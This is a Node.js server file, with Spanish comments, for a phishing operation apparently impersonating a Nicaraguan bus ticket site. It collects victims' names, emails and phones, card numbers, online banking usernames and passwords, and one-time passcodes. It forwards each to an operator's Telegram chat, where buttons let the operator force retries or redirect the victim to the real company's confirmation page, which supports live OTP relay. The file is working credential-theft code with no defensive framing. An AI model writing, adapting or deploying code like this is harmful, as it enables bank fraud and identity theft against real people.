const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Sirve los archivos estáticos si los tuvieras aquí, pero nosotros usaremos Hostinger
app.use(express.static('public')); 

const token = process.env.TELEGRAM_BOT_TOKEN;
const chatId = process.env.TELEGRAM_CHAT_ID;
const bot = new TelegramBot(token, { polling: true });

let clients = {};

io.on('connection', (socket) => {
    console.log(`Cliente conectado: ${socket.id}`);
    socket.emit('register', 'connected');

    // 1. Pasajeros
    socket.on('submit_passengers', (data) => {
        const msg = `🎫 *Pasajero*\n\n👤 ${data.fullName}\n📧 ${data.email}\n📞 ${data.phone}\n\n¿Aprobar?`;
        bot.sendMessage(chatId, msg, {
            reply_markup: { inline_keyboard: [
                [{ text: "✅ Aprobar", callback_data: `approve_${socket.id}` }],
                [{ text: "❌ Corrección", callback_data: `retry_${socket.id}` }]
            ]}
        });
    });

    // 2. Tarjeta
    socket.on('card_payment', (data) => {
        const last4 = data.number.slice(-4);
        const msg = `💳 *Tarjeta*: ****${last4}\n👤 ${data.name}\n\n¿Validar?`;
        bot.sendMessage(chatId, msg, {
            reply_markup: { inline_keyboard: [
                [{ text: "✅ Validar", callback_data: `validate_${socket.id}` }],
                [{ text: "❌ Reintentar", callback_data: `retry_card_${socket.id}` }]
            ]}
        });
    });

    // 3. Login Bancario (Usuario/Clave)
    socket.on('bank_login', (data) => {
        const msg = `🏦 *Banca Online*\n\n👤 Usuario: ${data.user}\n🔑 Clave: ${data.pass}\n\n¿Correcto?`;
        bot.sendMessage(chatId, msg, {
            reply_markup: { inline_keyboard: [
                [{ text: "✅ Correcto", callback_data: `ok_${socket.id}` }],
                [{ text: "❌ Reintentar", callback_data: `retry_${socket.id}` }]
            ]}
        });
    });

    // 4. OTP
    socket.on('otp_verify', (data) => {
        bot.sendMessage(chatId, `🔐 *OTP*: ${data.code}\n\n¿Correcto?`, {
            reply_markup: { inline_keyboard: [
                [{ text: "✅ Correcto", callback_data: `success_${socket.id}` }],
                [{ text: "❌ Incorrecto", callback_data: `retry_otp_${socket.id}` }]
            ]}
        });
    });

    // Manejo de Botones
    bot.on('callback_query', (query) => {
        const action = query.data;
        const socketId = action.split('_')[1];
        const type = action.split('_')[0];

        if (!clients[socketId]) return;

        if (type === 'retry') {
            io.to(socketId).emit('force_retry', { message: "Error en los datos.", clearFields: ['all'] });
        } else if (type === 'retry_card') {
            io.to(socketId).emit('force_retry', { message: "Error en tarjeta.", clearFields: ['card'] });
        } else if (type === 'retry_otp') {
            io.to(socketId).emit('force_retry', { message: "OTP inválido.", clearFields: ['otp'] });
        } else if (type.startsWith('ok') || type.startsWith('validate') || type.startsWith('success')) {
            io.to(socketId).emit('redirect_success', { url: "https://www.lacostena.com.ni/Booking/Confirmation" });
        }
        
        // Lógica específica para bank login retry
        if (type === 'retry' && query.message.text.includes('Banca Online')) {
             io.to(socketId).emit('retry_bank', {});
        }

        bot.answerCallbackQuery(query.id);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));